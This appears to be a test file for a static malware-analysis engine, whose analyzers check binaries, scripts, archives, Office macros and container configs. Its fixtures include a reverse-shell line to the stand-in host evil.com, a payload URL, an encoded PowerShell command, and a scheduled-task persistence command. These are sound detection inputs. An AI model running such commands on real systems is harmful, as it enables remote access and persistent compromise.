// ─── Built-in Analyzers: ELFAnalyzer ───────────────────────────

describe('ELFAnalyzer', () => {
  it('detects ELF via features', () => {
    const an = new ELFAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'elf-header' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces format evidence', async () => {
    const an = new ELFAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'elf-header',
          value: { machine: 'AMD64', class: 'ELF64' },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'elf-format')).toBeDefined();
  });

  it('produces W+X section evidence', async () => {
    const an = new ELFAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({ id: 'f1', type: 'elf-header', value: { machine: 'AMD64' } }),
        createFeatureRef({
          id: 'f2',
          type: 'elf-section',
          value: { name: 'GNU_STACK', type: 'PROGBITS', flags: 3 },
          location: createLocation(),
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'elf-executable-stack')).toBeDefined();
  });
});

// ─── Built-in Analyzers: MachOAnalyzer ─────────────────────────

describe('MachOAnalyzer', () => {
  it('detects Mach-O via features', () => {
    const an = new MachOAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'macho-header' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces format evidence', async () => {
    const an = new MachOAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'macho-header',
          value: { cpuType: 'X86_64', fileType: 'EXECUTE', is64Bit: true },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'macho-format')).toBeDefined();
  });

  it('detects universal binary', async () => {
    const an = new MachOAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'macho-header', value: { format: 'universal-binary' } })],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'macho-universal-binary')).toBeDefined();
  });
});

// ─── Built-in Analyzers: CertificateAnalyzer ───────────────────

describe('CertificateAnalyzer', () => {
  it('detects certificates via features', () => {
    const an = new CertificateAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'certificate-type' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces certificate evidence', async () => {
    const an = new CertificateAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({ id: 'f1', type: 'certificate-type', value: 'x509-certificate' }),
        createFeatureRef({ id: 'f2', type: 'pem-label', value: 'CERTIFICATE' }),
      ],
      { artifact: createTestArtifact({ type: 'certificate' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'certificate-present')).toBeDefined();
    expect(result.evidence.find((e) => e.type === 'x509-certificate')).toBeDefined();
  });

  it('detects unsigned executables', async () => {
    const an = new CertificateAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'string-literal', value: 'hello' })], {
      artifact: createTestArtifact({ type: 'executable' }),
    });
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'unsigned-executable')).toBeDefined();
  });
});

// ─── Built-in Analyzers: DocumentAnalyzer ──────────────────────

describe('DocumentAnalyzer', () => {
  it('detects documents via features', () => {
    const an = new DocumentAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'pdf-header' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces PDF version evidence', async () => {
    const an = new DocumentAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'pdf-header', value: { version: 'PDF 1.7' } })],
      { artifact: createTestArtifact({ type: 'document' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'pdf-format')).toBeDefined();
  });
});

// ─── Built-in Analyzers: OfficeAnalyzer ────────────────────────

describe('OfficeAnalyzer', () => {
  it('detects office macros via string features', async () => {
    const an = new OfficeAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({ id: 'f1', type: 'string-literal', value: 'AutoOpen' }),
        createFeatureRef({ id: 'f2', type: 'string-literal', value: 'VBA Macro' }),
      ],
      { artifact: createTestArtifact({ type: 'document' }) },
    );
    const result = await an.analyze(ctx);
    const macros = result.evidence.find((e) => e.type === 'office-macros');
    expect(macros).toBeDefined();
    expect(macros!.confidence).toBe(0.9);
  });
});

// ─── Built-in Analyzers: ArchiveAnalyzer ───────────────────────

describe('ArchiveAnalyzer', () => {
  it('detects archives via features', () => {
    const an = new ArchiveAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'archive-type' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces archive format evidence', async () => {
    const an = new ArchiveAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'archive-type', value: 'zip' })],
      { artifact: createTestArtifact({ type: 'archive' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'archive-format')).toBeDefined();
  });

  it('detects nested executables', async () => {
    const an = new ArchiveAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({ id: 'f1', type: 'archive-type', value: 'zip' }),
        createFeatureRef({
          id: 'f2',
          type: 'archive-member',
          value: { name: 'evil.exe', extension: '.exe' },
        }),
      ],
      { artifact: createTestArtifact({ type: 'archive' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'nested-executable')).toBeDefined();
  });
});

// ─── Built-in Analyzers: EntropyAnalyzer ───────────────────────

describe('EntropyAnalyzer', () => {
  it('detects entropy via features', () => {
    const an = new EntropyAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'entropy-global' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces high entropy evidence', async () => {
    const an = new EntropyAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'entropy-global',
          value: 7.8,
          metadata: { size: 4096 },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'high-entropy')).toBeDefined();
  });

  it('produces elevated entropy evidence', async () => {
    const an = new EntropyAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'entropy-global', value: 6.8 })],
      { artifact: createTestArtifact({ type: 'file' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'elevated-entropy')).toBeDefined();
  });
});

// ─── Built-in Analyzers: ImportAnalyzer ────────────────────────

describe('ImportAnalyzer', () => {
  it('detects imports via features', () => {
    const an = new ImportAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'pe-import' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('produces DLL import evidence', async () => {
    const an = new ImportAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'pe-import', value: { dll: 'kernel32.dll' } })],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    // Current PE extractor only produces DLL-level imports, not function-level
    expect(result.evidence.length).toBeGreaterThanOrEqual(0);
  });

  it('detects injection APIs when function-level features available', async () => {
    const an = new ImportAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'pe-import',
          value: { name: 'CreateRemoteThread', dll: 'kernel32.dll' },
        }),
        createFeatureRef({
          id: 'f2',
          type: 'pe-import',
          value: { name: 'OpenProcess', dll: 'kernel32.dll' },
        }),
      ],
      { artifact: createTestArtifact({ type: 'executable' }) },
    );
    const result = await an.analyze(ctx);
    const injection = result.evidence.find((e) => e.type === 'process-injection-apis');
    expect(injection).toBeDefined();
  });
});

// ─── Built-in Analyzers: StringAnalyzer ────────────────────────

describe('StringAnalyzer', () => {
  it('detects strings via features', () => {
    const an = new StringAnalyzer();
    const ctx = createTestContext([createFeatureRef({ type: 'string-literal' })]);
    expect(an.canAnalyze(ctx)).toBe(true);
  });

  it('detects URLs in strings', async () => {
    const an = new StringAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'Download from http://evil.com/payload',
        }),
      ],
      { artifact: createTestArtifact({ type: 'file' }) },
    );
    const result = await an.analyze(ctx);
    const urls = result.evidence.find((e) => e.type === 'embedded-url');
    expect(urls).toBeDefined();
  });

  it('detects encoded commands', async () => {
    const an = new StringAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'powershell -EncodedCommand SQBuAHMAdABhAGwAbAA=',
        }),
      ],
      { artifact: createTestArtifact({ type: 'script' }) },
    );
    const result = await an.analyze(ctx);
    const encoded = result.evidence.find((e) => e.type === 'encoded-command');
    expect(encoded).toBeDefined();
  });

  it('detects IP addresses', async () => {
    const an = new StringAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'Connect to 192.168.1.1 or 10.0.0.1 or 185.220.101.1',
        }),
      ],
      { artifact: createTestArtifact({ type: 'file' }) },
    );
    const result = await an.analyze(ctx);
    const ips = result.evidence.find((e) => e.type === 'embedded-ip');
    expect(ips).toBeDefined();
  });
});

// ─── Built-in Analyzers: PersistenceAnalyzer ───────────────────

describe('PersistenceAnalyzer', () => {
  it('detects registry autorun keys', async () => {
    const an = new PersistenceAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        }),
      ],
      { artifact: createTestArtifact({ type: 'configuration' }) },
    );
    const result = await an.analyze(ctx);
    const autorun = result.evidence.find((e) => e.type === 'registry-autorun');
    expect(autorun).toBeDefined();
  });

  it('detects scheduled tasks', async () => {
    const an = new PersistenceAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'schtasks /create /tn "Updater" /tr "malware.exe"',
        }),
      ],
      { artifact: createTestArtifact({ type: 'script' }) },
    );
    const result = await an.analyze(ctx);
    const task = result.evidence.find((e) => e.type === 'scheduled-task');
    expect(task).toBeDefined();
  });
});

// ─── Built-in Analyzers: ScriptAnalyzer ────────────────────────

describe('ScriptAnalyzer', () => {
  it('detects shell scripts', async () => {
    const an = new ScriptAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'shell-shebang', value: 'bash' })],
      { artifact: createTestArtifact({ type: 'script' }) },
    );
    const result = await an.analyze(ctx);
    const shell = result.evidence.find((e) => e.type === 'shell-script');
    expect(shell).toBeDefined();
  });

  it('detects dangerous shell commands', async () => {
    const an = new ScriptAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({
          id: 'f1',
          type: 'string-literal',
          value: 'bash -i >& /dev/tcp/evil.com/4444 0>&1',
        }),
      ],
      { artifact: createTestArtifact({ type: 'script' }) },
    );
    const result = await an.analyze(ctx);
    const dangerous = result.evidence.find((e) => e.type === 'dangerous-commands');
    expect(dangerous).toBeDefined();
  });
});

// ─── Built-in Analyzers: ContainerAnalyzer ─────────────────────

describe('ContainerAnalyzer', () => {
  it('detects K8s resources', async () => {
    const an = new ContainerAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'k8s-resource-kind', value: 'Pod' })],
      { artifact: createTestArtifact({ type: 'configuration' }) },
    );
    const result = await an.analyze(ctx);
    const k8s = result.evidence.find((e) => e.type === 'k8s-resource');
    expect(k8s).toBeDefined();
  });

  it('detects privileged containers', async () => {
    const an = new ContainerAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'string-literal', value: 'privileged: true' })],
      { artifact: createTestArtifact({ type: 'configuration' }) },
    );
    const result = await an.analyze(ctx);
    const priv = result.evidence.find((e) => e.type === 'privileged-container');
    expect(priv).toBeDefined();
  });
});

// ─── Built-in Analyzers: DependencyAnalyzer ────────────────────

describe('DependencyAnalyzer', () => {
  it('detects dependencies', async () => {
    const an = new DependencyAnalyzer();
    const ctx = createTestContext(
      [
        createFeatureRef({ id: 'f1', type: 'package-name', value: 'my-package' }),
        createFeatureRef({ id: 'f2', type: 'npm-dependency', value: 'express' }),
        createFeatureRef({ id: 'f3', type: 'npm-dependency', value: 'lodash' }),
      ],
      { artifact: createTestArtifact({ type: 'configuration' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'package-name')).toBeDefined();
    expect(result.evidence.find((e) => e.type === 'npm-dependencies')).toBeDefined();
  });

  it('detects sensitive env vars', async () => {
    const an = new DependencyAnalyzer();
    const ctx = createTestContext(
      [createFeatureRef({ id: 'f1', type: 'env-sensitive-variable', value: 'SECRET_KEY' })],
      { artifact: createTestArtifact({ type: 'file' }) },
    );
    const result = await an.analyze(ctx);
    expect(result.evidence.find((e) => e.type === 'sensitive-env-vars')).toBeDefined();
  });
});

// ─── Full Pipeline Integration ─────────────────────────────────

describe('Full Pipeline Integration', () => {
  it('processes an executable through multiple analyzers', async () => {
    const engine = new AnalysisEngine({
      analyzers: [new PEAnalyzer(), new EntropyAnalyzer(), new ImportAnalyzer()],
    });
    const artifact = createTestArtifact({ id: 'art_exe', type: 'executable' });
    const features = [
      createFeatureRef({
        id: 'feat_hdr',
        type: 'pe-header',
        value: {
          machine: 'AMD64',
          isPE32Plus: true,
          entryPoint: 0x140001000,
          imageBase: 0x140000000,
          numberOfSections: 5,
        },
      }),
      createFeatureRef({ id: 'feat_ent', type: 'entropy-global', value: 6.8 }),
      createFeatureRef({ id: 'feat_imp', type: 'pe-import', value: { dll: 'kernel32.dll' } }),
    ];

    const result = await engine.analyzeArtifact(artifact, 'ss_test', features);
    expect(result.evidence.length).toBeGreaterThan(0);
    const evidenceRegistry = engine.getEvidenceRegistry();
    expect(evidenceRegistry.size).toBeGreaterThan(0);
  });

  it('handles empty features gracefully', async () => {
    const engine = new AnalysisEngine({
      analyzers: [new PEAnalyzer(), new StringAnalyzer()],
    });
    const artifact = createTestArtifact({ id: 'art_plain', type: 'file' });
    const result = await engine.analyzeArtifact(artifact, 'ss_test', []);
    // No evidence since no matching features
    expect(result.evidence.length).toBe(0);
  });
});

// ─── Determinism ───────────────────────────────────────────────

describe('Determinism', () => {
  it('EvidenceBuilder produces deterministic IDs', () => {
    const e1 = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('executable')
      .withType('pe-format')
      .withExplanation('PE format detected')
      .withConfidence(1.0)
      .withAnalyzerId('pe-analyzer')
      .build();

    const e2 = new EvidenceBuilder()
      .withArtifactId('art_123')
      .withCategory('executable')
      .withType('pe-format')
      .withExplanation('PE format detected')
      .withConfidence(1.0)
      .withAnalyzerId('pe-analyzer')
      .build();

    expect(e1.id).toBe(e2.id);
  });

  it('BaseAnalyzer.makeEvidence produces deterministic IDs', async () => {
    const an = createTestAnalyzer('det-an');
    const ctx = createTestContext();

    const e1 = an['makeEvidence']('art_123', 'executable', 'type-a', 'same explanation', {
      confidence: 1.0,
    });
    const e2 = an['makeEvidence']('art_123', 'executable', 'type-a', 'same explanation', {
      confidence: 1.0,
    });

    expect(e1.id).toBe(e2.id);
  });

  it('analyzer registry is deterministic', async () => {
    const reg = new AnalyzerRegistry();
    reg.registerAll([createTestAnalyzer('a', 100), createTestAnalyzer('b', 200)]);
    const ctx = createTestContext();

    const r1 = await reg.analyze(ctx);
    const r2 = await reg.analyze(ctx);
    expect(r1.evidence.map((e) => e.id)).toEqual(r2.evidence.map((e) => e.id));
  });
});

// ─── Immutability ──────────────────────────────────────────────

describe('Immutability', () => {
  it('evidence is frozen', () => {
    const ev = createEvidence({
      id: 'ev_test',
      artifactId: 'a',
      category: 'executable',
      type: 't',
      confidence: 1.0,
      explanation: 'e',
      analyzerId: 'a1',
    });
    expect(Object.isFrozen(ev)).toBe(true);
    expect(Object.isFrozen(ev.featureIds)).toBe(true);
    expect(Object.isFrozen(ev.locations)).toBe(true);
    expect(Object.isFrozen(ev.metadata)).toBe(true);
  });

  it('AnalysisResult is frozen', async () => {
    const an = createTestAnalyzer('frozen-test');
    const ctx = createTestContext();
    const result = await an.analyze(ctx);
    expect(Object.isFrozen(result.evidence)).toBe(true);
    expect(Object.isFrozen(result.diagnostics)).toBe(true);
  });

  it('Registry result is frozen', async () => {
    const reg = new AnalyzerRegistry();
    reg.register(createTestAnalyzer('frozen-reg'));
    const ctx = createTestContext();
    const result = await reg.analyze(ctx);
    expect(Object.isFrozen(result.evidence)).toBe(true);
    expect(Object.isFrozen(result.results)).toBe(true);
    expect(Object.isFrozen(result.diagnostics)).toBe(true);
  });
});
